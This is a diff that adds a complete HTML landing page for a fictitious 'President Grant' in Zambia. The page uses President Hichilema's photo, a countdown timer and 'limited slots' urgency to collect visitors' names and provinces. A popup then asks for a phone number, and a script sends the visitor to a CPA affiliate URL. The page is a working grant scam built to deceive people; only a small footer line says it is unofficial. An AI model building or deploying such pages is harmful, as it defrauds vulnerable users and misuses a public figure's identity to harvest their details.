@@ -1,0 +1,732 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>President Grant | Zambia Registration</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg0:#050814;
+      --bg1:#070c1b;
+
+      --text:#eef3ff;
+      --muted: rgba(238,243,255,.72);
+
+      --stroke: rgba(255,255,255,.12);
+
+      /* Zambia flag palette */
+      --z-green:#198754;
+      --z-red:#d72638;
+      --z-black:#0b0f16;
+      --z-orange:#ff7a00;
+
+      /* Accent */
+      --a1:#7c3aed;
+      --a2:#06b6d4;
+      --a3:#22c55e;
+      --a4:#f59e0b;
+      --danger:#ff4d4d;
+
+      --shadow: 0 30px 90px rgba(0,0,0,.55);
+      --radius: 22px;
+    }
+
+    *{ box-sizing:border-box }
+    html, body { height: 100%; }
+    body{
+      margin:0;
+      font-family: "Manrope", system-ui, -apple-system, Segoe UI, Roboto, Arial;
+      color: var(--text);
+      background:
+        radial-gradient(900px 480px at 70% 10%, rgba(124,58,237,.25), transparent 60%),
+        radial-gradient(800px 420px at 15% 35%, rgba(6,182,212,.22), transparent 55%),
+        radial-gradient(700px 420px at 90% 60%, rgba(34,197,94,.16), transparent 60%),
+        linear-gradient(180deg, var(--bg0), var(--bg1));
+      overflow-x:hidden;
+    }
+
+    .bg-dots{
+      position: fixed;
+      inset: 0;
+      pointer-events:none;
+      opacity:.30;
+      background-image: radial-gradient(rgba(255,255,255,.10) 1px, transparent 1px);
+      background-size: 26px 26px;
+      mask-image: radial-gradient(60% 50% at 50% 15%, black, transparent 75%);
+      animation: drift 14s linear infinite;
+    }
+    @keyframes drift{
+      0%{ transform: translateY(0); }
+      100%{ transform: translateY(26px); }
+    }
+
+    .wrap{ max-width: 1180px; margin: 0 auto; padding: 18px; }
+
+    .flagbar{
+      border:1px solid rgba(255,255,255,.10);
+      background: rgba(255,255,255,.04);
+      border-radius: 18px;
+      overflow:hidden;
+      box-shadow: 0 18px 70px rgba(0,0,0,.35);
+      backdrop-filter: blur(10px);
+    }
+    .flagstripe{ height: 12px; display:flex; width:100%; }
+    .flagstripe span{ flex:1 }
+    .flagstripe .g{ background: var(--z-green); }
+    .flagstripe .r{ background: var(--z-red); }
+    .flagstripe .b{ background: var(--z-black); }
+    .flagstripe .o{ background: var(--z-orange); }
+
+    .flagcontent{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      padding: 12px 14px;
+    }
+    .brand{ display:flex; align-items:center; gap:10px; font-weight:900; letter-spacing:.2px; }
+    .logo{
+      width:42px;height:42px;border-radius:16px;
+      display:grid;place-items:center;
+      background: linear-gradient(135deg, rgba(6,182,212,.22), rgba(124,58,237,.20));
+      border:1px solid rgba(255,255,255,.12);
+      box-shadow: 0 10px 40px rgba(6,182,212,.14);
+    }
+    .brand small{ display:block; color: var(--muted); font-weight:700; margin-top:2px; font-size: 12px; }
+
+    .pill{
+      display:flex; align-items:center; gap:8px;
+      padding: 8px 12px;
+      border-radius: 999px;
+      border: 1px solid var(--stroke);
+      background: rgba(255,255,255,.05);
+      backdrop-filter: blur(10px);
+      font-size: 12px;
+      color: rgba(238,243,255,.82);
+      white-space: nowrap;
+    }
+    .dot{
+      width:8px;height:8px;border-radius:50%;
+      background: var(--a3);
+      box-shadow: 0 0 0 6px rgba(34,197,94,.18);
+    }
+
+    .hero{
+      display:grid;
+      grid-template-columns: 1.05fr .95fr;
+      gap: 18px;
+      margin-top: 14px;
+      align-items: stretch;
+    }
+
+    .panel{
+      border: 1px solid var(--stroke);
+      background: linear-gradient(180deg, rgba(255,255,255,.07), rgba(255,255,255,.04));
+      border-radius: var(--radius);
+      overflow:hidden;
+      box-shadow: var(--shadow);
+      position: relative;
+    }
+
+    .heroBanner{
+      min-height: 520px;
+      padding: 18px;
+      display:flex;
+      flex-direction: column;
+      justify-content: flex-end;
+      gap: 10px;
+      position:relative;
+      overflow:hidden;
+
+      background:
+        radial-gradient(900px 420px at 70% 0%, rgba(6,182,212,.22), transparent 60%),
+        radial-gradient(900px 520px at 20% 40%, rgba(124,58,237,.22), transparent 60%),
+        linear-gradient(180deg, rgba(0,0,0,.08) 0%, rgba(0,0,0,.72) 72%);
+    }
+
+    .heroBanner::before{
+      content:"";
+      position:absolute;
+      inset:0;
+      background:
+        radial-gradient(700px 400px at 55% 22%, rgba(245,158,11,.12), transparent 60%),
+        url("https://commons.wikimedia.org/wiki/Special:FilePath/President_of_Zambia_Hakainde_Hichilema_at_the_US_SFRC.jpg?width=1600");
+      background-size: cover;
+      background-position: center 18%;
+      opacity: .16;
+      filter: contrast(1.12) saturate(1.05);
+      z-index: 0;
+    }
+
+    .heroBanner::after{
+      content:"";
+      position:absolute;
+      inset:0;
+      background: linear-gradient(180deg, rgba(0,0,0,.10), rgba(0,0,0,.84) 78%);
+      z-index: 1;
+    }
+
+    .heroBanner *{ position:relative; z-index: 2; }
+
+    .presCard{
+      position:absolute;
+      top: 16px;
+      left: 16px;
+      z-index: 3;
+      display:flex;
+      align-items:center;
+      gap:14px;
+      padding: 14px 16px;
+      border-radius: 20px;
+      border: 1px solid rgba(255,255,255,.16);
+      background: rgba(0,0,0,.30);
+      backdrop-filter: blur(10px);
+      box-shadow: 0 18px 70px rgba(0,0,0,.35);
+      max-width: 520px;
+    }
+    .presPhoto{
+      width: 110px;
+      height: 110px;
+      border-radius: 24px;
+      overflow:hidden;
+      border: 1px solid rgba(255,255,255,.22);
+      flex: 0 0 auto;
+      box-shadow: 0 18px 60px rgba(0,0,0,.35);
+      background: rgba(255,255,255,.04);
+    }
+    .presPhoto img{
+      width:100%;
+      height:100%;
+      object-fit: cover;
+      display:block;
+      filter: saturate(1.05) contrast(1.06);
+      transform: scale(1.03);
+    }
+    .presInfo b{
+      display:block;
+      font-size: 16px;
+      font-weight: 1000;
+      letter-spacing: .2px;
+    }
+    .presInfo span{
+      display:block;
+      font-size: 13px;
+      color: rgba(238,243,255,.78);
+      font-weight: 800;
+      margin-top: 4px;
+    }
+    .presInfo small{
+      display:block;
+      font-size: 12px;
+      color: rgba(238,243,255,.62);
+      font-weight: 700;
+      margin-top: 6px;
+    }
+
+    .heroBadges{
+      display:flex; flex-wrap:wrap; gap:10px;
+      margin-bottom: 6px;
+    }
+    .heroBadge{
+      display:inline-flex; align-items:center; gap:8px;
+      padding: 8px 12px;
+      border-radius: 999px;
+      border: 1px solid var(--stroke);
+      background: rgba(0,0,0,.28);
+      backdrop-filter: blur(10px);
+      font-size: 12px;
+      color: rgba(238,243,255,.88);
+      font-weight: 800;
+    }
+    .spark{
+      width: 18px; height: 18px; border-radius: 7px;
+      background: linear-gradient(135deg, rgba(245,158,11,.95), rgba(34,197,94,.85));
+      box-shadow: 0 12px 30px rgba(245,158,11,.18);
+    }
+
+    .headline{
+      margin:0;
+      font-size: 42px;
+      line-height: 1.08;
+      font-weight: 1000;
+      max-width: 28ch;
+      text-shadow: 0 18px 60px rgba(0,0,0,.65);
+    }
+    .subhead{
+      margin: 6px 0 0;
+      color: rgba(238,243,255,.82);
+      font-weight: 800;
+      max-width: 74ch;
+    }
+
+    .countdown{ display:flex; gap:10px; flex-wrap:wrap; margin-top: 12px; }
+    .timebox{
+      min-width: 96px;
+      padding: 10px 12px;
+      border-radius: 16px;
+      border: 1px solid var(--stroke);
+      background: rgba(0,0,0,.28);
+      backdrop-filter: blur(12px);
+      text-align:center;
+    }
+    .num{ font-size: 26px; font-weight: 1000; line-height: 1; }
+    .lbl{ font-size: 12px; color: rgba(238,243,255,.75); margin-top: 4px; }
+
+    .formWrap{ padding: 18px; display:flex; flex-direction: column; gap: 12px; }
+    .formTitle{ display:flex; align-items:flex-start; justify-content:space-between; gap:12px; }
+    .formTitle h2{ margin:0; font-size: 22px; font-weight: 1000; }
+    .formTitle p{ margin: 6px 0 0; color: var(--muted); font-weight: 800; }
+
+    .glass{
+      border: 1px solid var(--stroke);
+      background: rgba(255,255,255,.05);
+      border-radius: 18px;
+      padding: 12px;
+    }
+
+    .field{ display:flex; flex-direction:column; gap: 7px; }
+    label{ font-weight: 1000; font-size: 13px; letter-spacing:.2px; }
+    input{
+      padding: 13px 12px;
+      border-radius: 14px;
+      border: 1px solid var(--stroke);
+      background: rgba(255,255,255,.04);
+      color: var(--text);
+      outline:none;
+      font-size: 15px;
+    }
+    input::placeholder{ color: rgba(238,243,255,.45); }
+    input:focus{ border-color: rgba(6,182,212,.60); box-shadow: 0 0 0 4px rgba(6,182,212,.16); }
+
+    .grid2{ display:grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+
+    .btn{
+      width:100%;
+      border: none;
+      border-radius: 16px;
+      padding: 13px 14px;
+      font-weight: 1000;
+      font-size: 16px;
+      cursor:pointer;
+      color: #071016;
+      background: linear-gradient(90deg, rgba(34,197,94,1), rgba(6,182,212,1));
+      box-shadow: 0 18px 60px rgba(6,182,212,.22);
+      transition: transform .08s ease, filter .2s ease;
+    }
+    .btn:hover{ filter: brightness(1.05); }
+    .btn:active{ transform: translateY(1px); }
+
+    .status{
+      display:none;
+      padding: 10px 12px;
+      border-radius: 16px;
+      border:1px solid var(--stroke);
+      background: rgba(255,255,255,.05);
+      font-weight: 900;
+      margin-top: 10px;
+    }
+    .status.ok{ border-color: rgba(34,197,94,.35); }
+    .status.err{ border-color: rgba(255,77,77,.40); color: #ffd1d1; }
+
+    .fineprint{ font-size: 12px; color: rgba(238,243,255,.62); line-height: 1.5; font-weight:700; }
+
+    footer{
+      padding: 26px 18px 90px;
+      text-align:center;
+      color: rgba(238,243,255,.55);
+      font-size: 12px;
+    }
+
+    .stickyCTA{
+      position: fixed;
+      left: 0; right: 0; bottom: 0;
+      padding: 12px;
+      background: linear-gradient(180deg, transparent, rgba(5,8,20,.82) 30%, rgba(5,8,20,.92));
+      backdrop-filter: blur(10px);
+      border-top: 1px solid rgba(255,255,255,.10);
+      display:none;
+      z-index: 50;
+    }
+    .stickyInner{
+      max-width: 1180px;
+      margin: 0 auto;
+      display:flex;
+      gap: 10px;
+      align-items:center;
+      justify-content:space-between;
+      padding: 0 6px;
+    }
+    .stickyText b{ display:block; font-size: 13px; font-weight:1000; }
+    .stickyText span{ display:block; font-size: 12px; color: rgba(238,243,255,.68); font-weight:800; }
+    .stickyBtn{
+      border:none;
+      border-radius: 16px;
+      padding: 12px 14px;
+      font-weight: 1000;
+      cursor:pointer;
+      color:#071016;
+      background: linear-gradient(90deg, rgba(245,158,11,1), rgba(34,197,94,1));
+      box-shadow: 0 18px 60px rgba(245,158,11,.18);
+      white-space:nowrap;
+    }
+
+    @media (max-width: 1020px){
+      .hero{ grid-template-columns: 1fr; }
+      .headline{ font-size: 34px; }
+      .stickyCTA{ display:block; }
+      .presCard{ position: static; margin-bottom: 10px; max-width: 100%; }
+    }
+    @media (max-width: 560px){
+      .grid2{ grid-template-columns: 1fr; }
+      .headline{ font-size: 30px; }
+      .timebox{ min-width: 88px; }
+      .presPhoto{ width: 96px; height: 96px; }
+    }
+
+    .reveal{ opacity:0; transform: translateY(10px); animation: in .7s ease forwards; }
+    .reveal.delay1{ animation-delay: .08s; }
+    .reveal.delay2{ animation-delay: .16s; }
+    @keyframes in{ to{ opacity:1; transform: translateY(0); } }
+
+    /* ====== PRO POPUP (Modal) ====== */
+    .modalOverlay{
+      position: fixed;
+      inset: 0;
+      display:none;
+      align-items: center;
+      justify-content: center;
+      padding: 18px;
+      background: rgba(0,0,0,.55);
+      backdrop-filter: blur(8px);
+      z-index: 999;
+    }
+    .modalOverlay.show{ display:flex; }
+
+    .modalCard{
+      width: min(560px, 100%);
+      border-radius: 22px;
+      border: 1px solid rgba(255,255,255,.16);
+      background: linear-gradient(180deg, rgba(255,255,255,.10), rgba(255,255,255,.05));
+      box-shadow: 0 35px 120px rgba(0,0,0,.65);
+      overflow:hidden;
+      transform: translateY(10px) scale(.98);
+      opacity: 0;
+      animation: pop .18s ease forwards;
+    }
+    @keyframes pop{
+      to{ transform: translateY(0) scale(1); opacity: 1; }
+    }
+
+    .modalTop{
+      padding: 16px 16px 10px;
+      display:flex;
+      align-items:center;
+      gap: 12px;
+      border-bottom: 1px solid rgba(255,255,255,.12);
+      background: rgba(0,0,0,.20);
+    }
+    .modalIcon{
+      width:44px;height:44px;border-radius:16px;
+      display:grid;place-items:center;
+      background: linear-gradient(135deg, rgba(245,158,11,.95), rgba(34,197,94,.85));
+      box-shadow: 0 18px 60px rgba(245,158,11,.18);
+      color: #071016;
+      font-weight: 1000;
+    }
+    .modalTitle{
+      margin:0;
+      font-size: 16px;
+      font-weight: 1000;
+    }
+    .modalBody{
+      padding: 14px 16px 16px;
+      color: rgba(238,243,255,.86);
+      font-weight: 800;
+      line-height: 1.55;
+    }
+    .modalHint{
+      margin-top: 10px;
+      font-size: 12px;
+      color: rgba(238,243,255,.65);
+      font-weight: 800;
+    }
+    .modalActions{
+      display:flex;
+      gap: 10px;
+      padding: 0 16px 16px;
+      justify-content:flex-end;
+    }
+    .okBtn{
+      border:none;
+      border-radius: 16px;
+      padding: 12px 16px;
+      font-weight: 1000;
+      cursor:pointer;
+      color:#071016;
+      background: linear-gradient(90deg, rgba(34,197,94,1), rgba(6,182,212,1));
+      box-shadow: 0 18px 60px rgba(6,182,212,.20);
+      min-width: 110px;
+    }
+    .okBtn:active{ transform: translateY(1px); }
+  </style>
+</head>
+
+<body>
+  <div class="bg-dots"></div>
+
+  <!-- ✅ POPUP -->
+  <div class="modalOverlay" id="modalOverlay" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalMsg">
+    <div class="modalCard">
+      <div class="modalTop">
+        <div class="modalIcon">!</div>
+        <div>
+          <h3 class="modalTitle" id="modalTitle">Just one more thing</h3>
+          <div style="font-size:12px;color:rgba(238,243,255,.68);font-weight:800;">Phone number required</div>
+        </div>
+      </div>
+      <div class="modalBody">
+        <div id="modalMsg">
+          Please enter your phone number so we can call you. Tap <b>OK</b> to continue.
+        </div>
+        <div class="modalHint">You’ll complete the phone step on the next page.</div>
+      </div>
+      <div class="modalActions">
+        <button class="okBtn" id="modalOkBtn" type="button">OK</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <div class="flagbar reveal">
+      <div class="flagstripe" aria-label="Zambia flag colors">
+        <span class="g"></span><span class="r"></span><span class="b"></span><span class="o"></span>
+      </div>
+      <div class="flagcontent">
+        <div class="brand">
+          <div class="logo">🇿🇲</div>
+          <div>
+            <div style="font-size:16px;">President Grant</div>
+            <small>Zambia Registration Portal</small>
+          </div>
+        </div>
+        <div class="pill" id="urgencyText">
+          <span class="dot"></span>
+          Limited-time registration
+        </div>
+      </div>
+    </div>
+
+    <div class="hero">
+      <div class="panel heroBanner reveal delay1">
+        <div class="presCard" aria-label="President of Zambia">
+          <div class="presPhoto">
+            <img id="presAvatar"
+                 alt="President of Zambia"
+                 src="https://commons.wikimedia.org/wiki/Special:FilePath/President_of_Zambia_Hakainde_Hichilema_at_the_US_SFRC_(cropped).jpg?width=512">
+          </div>
+          <div class="presInfo">
+            <b>President of Zambia</b>
+            <span>Hakainde Hichilema</span>
+            <small>Portrait (public source)</small>
+          </div>
+        </div>
+
+        <div class="heroBadges">
+          <div class="heroBadge"><span class="spark"></span> Fast registration</div>
+          <div class="heroBadge">Secure form</div>
+          <div class="heroBadge">Limited slots</div>
+        </div>
+
+        <h1 class="headline">Apply now for the President Grant (Zambia)</h1>
+        <p class="subhead">
+          Fill in your details to continue to the next step. Registration is open for a limited time.
+        </p>
+
+        <div class="countdown" aria-label="countdown timer">
+          <div class="timebox"><div class="num" id="d">00</div><div class="lbl">Days</div></div>
+          <div class="timebox"><div class="num" id="h">00</div><div class="lbl">Hours</div></div>
+          <div class="timebox"><div class="num" id="m">00</div><div class="lbl">Minutes</div></div>
+          <div class="timebox"><div class="num" id="s">00</div><div class="lbl">Seconds</div></div>
+        </div>
+      </div>
+
+      <div class="panel reveal delay2">
+        <div class="formWrap">
+          <div class="formTitle">
+            <div>
+              <h2>Registration Form</h2>
+              <p>Enter your full name and province/state.</p>
+            </div>
+            <div class="pill" style="gap:6px;">
+              <span style="width:8px;height:8px;border-radius:50%;background:linear-gradient(135deg,var(--a4),var(--a2));box-shadow:0 0 0 6px rgba(6,182,212,.12)"></span>
+              Step 1/1
+            </div>
+          </div>
+
+          <form id="leadForm" class="glass">
+            <div class="grid2">
+              <div class="field">
+                <label for="name">Full Name</label>
+                <input id="name" name="name" type="text" placeholder="e.g., John Mwansa" required minlength="3"/>
+              </div>
+
+              <div class="field">
+                <label for="state">Province / State</label>
+                <input id="state" name="state" type="text" placeholder="e.g., Lusaka Province" required minlength="2"/>
+              </div>
+            </div>
+
+            <div style="height:10px"></div>
+            <button class="btn" type="submit">Continue</button>
+
+            <div class="status err" id="errMsg">Please check your details and try again.</div>
+
+            <div style="margin-top:10px" class="fineprint">
+              By continuing, you agree to be contacted about the registration.
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      © <span id="year"></span> President Grant — Registration Page.
+      <br/>
+      <span style="opacity:.55;">Independent registration page (not an official government website).</span>
+    </footer>
+  </div>
+
+  <div class="stickyCTA">
+    <div class="stickyInner">
+      <div class="stickyText">
+        <b>President Grant Registration</b>
+        <span>Submit your details to continue</span>
+      </div>
+      <button class="stickyBtn" type="button"
+        onclick="document.getElementById('leadForm').scrollIntoView({behavior:'smooth',block:'center'})">
+        Register Now
+      </button>
+    </div>
+  </div>
+
+  <script>
+    // Countdown end time (Lusaka typically UTC+2)
+    const END_AT = "2026-03-01T23:59:00+02:00";
+
+    // CPA redirect URL
+    const CPA_URL = "https://iconics.adsleads1.store/?utm_medium=45cb5b04ee2dd3d524876ef99d99f52ba4436745&utm_campaign=menhaza";
+
+    // Dates
+    const today = new Date();
+    document.getElementById("year").textContent = today.getFullYear();
+
+    // Countdown
+    const el = (id) => document.getElementById(id);
+    const pad = (n) => String(n).padStart(2, "0");
+
+    function tick(){
+      const end = new Date(END_AT).getTime();
+      const now = Date.now();
+      let diff = Math.max(0, end - now);
+
+      const d = Math.floor(diff / (1000*60*60*24));
+      diff -= d * (1000*60*60*24);
+      const h = Math.floor(diff / (1000*60*60));
+      diff -= h * (1000*60*60);
+      const m = Math.floor(diff / (1000*60));
+      diff -= m * (1000*60);
+      const s = Math.floor(diff / 1000);
+
+      el("d").textContent = pad(d);
+      el("h").textContent = pad(h);
+      el("m").textContent = pad(m);
+      el("s").textContent = pad(s);
+
+      if (end - now <= 0) {
+        document.getElementById("urgencyText").innerHTML =
+          '<span class="dot" style="background:var(--danger); box-shadow:0 0 0 6px rgba(255,77,77,.14)"></span> Registration closed';
+      }
+    }
+    tick();
+    setInterval(tick, 1000);
+
+    // Avatar fallback
+    const avatar = document.getElementById("presAvatar");
+    if (avatar) {
+      avatar.onerror = () => {
+        avatar.onerror = null;
+        avatar.src = "https://upload.wikimedia.org/wikipedia/commons/e/e3/President_of_Zambia_Hakainde_Hichilema_at_the_US_SFRC_%28cropped%29.jpg";
+      };
+    }
+
+    // ====== Pro Popup logic ======
+    const modalOverlay = document.getElementById("modalOverlay");
+    const okBtn = document.getElementById("modalOkBtn");
+
+    function openModal(){
+      modalOverlay.classList.add("show");
+      // focus OK
+      setTimeout(() => okBtn.focus(), 0);
+      // lock scroll
+      document.body.style.overflow = "hidden";
+    }
+    function closeModal(){
+      modalOverlay.classList.remove("show");
+      document.body.style.overflow = "";
+    }
+
+    // Close on overlay click (optional)
+    modalOverlay.addEventListener("click", (e) => {
+      if (e.target === modalOverlay) {
+        // لازم OK للتحويل، فهنقفل بس بدون تحويل
+        closeModal();
+      }
+    });
+
+    // Close on ESC (optional)
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "Escape" && modalOverlay.classList.contains("show")) closeModal();
+    });
+
+    // Form submit
+    const form = document.getElementById("leadForm");
+    const errMsg = document.getElementById("errMsg");
+
+    // We'll store redirect in variable (so only after OK)
+    let pendingRedirectUrl = null;
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      errMsg.style.display = "none";
+
+      const name = document.getElementById("name").value.trim();
+      const state = document.getElementById("state").value.trim();
+
+      if (name.length < 3) {
+        errMsg.textContent = "Please enter your full name.";
+        errMsg.style.display = "block";
+        return;
+      }
+      if (state.length < 2) {
+        errMsg.textContent = "Please enter your province/state.";
+        errMsg.style.display = "block";
+        return;
+      }
+
+      // Show popup then redirect after OK
+      pendingRedirectUrl = CPA_URL;
+      openModal();
+    });
+
+    okBtn.addEventListener("click", () => {
+      closeModal();
+      if (pendingRedirectUrl) window.location.href = pendingRedirectUrl;
+    });
+  </script>
+</body>
+</html>
